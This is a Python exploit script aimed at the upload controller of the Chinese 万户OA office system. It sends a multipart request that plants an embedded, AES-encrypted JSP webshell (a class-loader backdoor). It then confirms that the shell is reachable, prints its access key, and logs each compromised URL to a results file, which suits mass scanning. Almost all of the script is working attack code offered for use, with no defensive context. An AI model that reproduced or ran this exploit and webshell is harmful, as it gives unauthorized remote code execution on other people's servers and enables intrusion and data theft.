import re

import requests
import time
import buter
import wirtefile

filename = "./reps/万户OA-controller-upload-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0',
    }
poc = "/defaultroot/upload/fileUpload.controller"

shell = '''<%! String xc="3c6e0b8a9c15224a"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }}
%><%try{byte[] data=new byte[Integer.parseInt(request.getHeader("Content-Length"))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))<data.length);data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters", data);Object f=((Class)session.getAttribute("payload")).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));} }catch (Exception e){}
%>'''

data = '--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name="file"; filename="cmd.jsp"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n{0}\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--'.format(
        shell)

def whoafileup(url):
    try:
        rep = requests.post(url=url+poc, headers=headers, timeout=3, data=data, verify=False)
        if rep.status_code == 200 and re.search('\d+\.jsp', rep.text):

            shell_name = re.findall('\d+\.jsp', rep.text)[0]
            shell_path = url+"/defaultroot/upload/html/"+shell_name
            print(buter.colors.GREEN + f"存在万户OA-controller-upload url : {url}"+ buter.colors.END)
            verify_rep = requests.get(url=shell_path, timeout=3, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'},
                                      verify=False)
            if verify_rep.status_code == 200:
                print(buter.colors.GREEN + f"webshell 上传成功 请使用pass,key,JAVA_AES_RAW 访问 : {shell_path}"+ buter.colors.END)
                reptext = f"{shell_path} pass key JAVA_AES_RAW"
                wirtefile.writefiles(filename,reptext)
            else:
                print(buter.colors.YELLOW + f"webshell 访问/上传失败 请手工尝试 url : {url}" + buter.colors.END)
        else:
            print(buter.colors.RED+ f"未发现万户OA-controller-upload url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)

